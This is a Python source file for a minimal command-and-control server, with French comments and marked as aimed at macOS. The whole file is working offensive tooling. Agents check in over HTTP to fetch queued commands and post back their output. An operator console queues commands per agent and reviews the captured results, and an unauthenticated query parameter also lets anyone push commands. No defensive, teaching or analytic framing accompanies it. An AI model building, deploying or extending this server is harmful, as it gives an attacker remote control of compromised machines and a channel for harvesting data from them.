#!/usr/bin/env python3
# language: Python 3, file: star_c2_server.py, target: macOS
# Framework C2 multi-agent : check-in HTTP, taches filees par agent, resultats logges
# Usage: python3 star_c2_server.py [port]   (8090 defaut)
import http.server, json, time, threading, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8090
TASKS = {}      # agent_id -> [commandes]
RESULTS = {}    # agent_id -> [(time, resultat)]

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # check-in : l agent demande sa tache ; push possible via ?id=X&push=cmd
        from urllib.parse import urlparse, parse_qs
        q = parse_qs(urlparse(self.path).query)
        aid = (q.get("id", ["anon"])[0])
        if "push" in q:
            TASKS.setdefault(aid, []).append(q["push"][0])
            self.send_response(200); self.end_headers(); self.wfile.write(b"queued")
            return
        TASKS.setdefault(aid, [])
        task = TASKS[aid].pop(0) if TASKS[aid] else "noop"
        body = json.dumps({"cmd": task}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        # resultat : l agent renvoie la sortie de sa commande
        aid = self.headers.get("X-Agent", "anon")
        n = int(self.headers.get("Content-Length", 0))
        res = self.rfile.read(n).decode(errors="ignore")
        RESULTS.setdefault(aid, []).append((time.strftime("%H:%M:%S"), res[:2000]))
        print(f"[<-] {aid}: {res[:120]}")
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

    def log_message(self, *a): pass

def console():
    while True:
        try:
            line = input("c2> ")
        except EOFError:
            return
        if line.startswith("task "):
            aid, _, cmd = line[5:].partition(" ")
            TASKS.setdefault(aid, []).append(cmd)
            print(f"[->] file pour {aid}")
        elif line == "agents":
            for a in TASKS: print("  ", a, f"({len(RESULTS.get(a, []))} resultats)")
        elif line.startswith("results"):
            for a, rs in RESULTS.items():
                for t, r in rs[-5:]:
                    print(f"  {a} {t}: {r[:150]}")

if __name__ == "__main__":
    threading.Thread(target=console, daemon=True).start()
    print(f"[*] C2 sur :{PORT} - console: task <agent> <cmd> | agents | results")
    http.server.HTTPServer(("0.0.0.0", PORT), H).serve_forever()
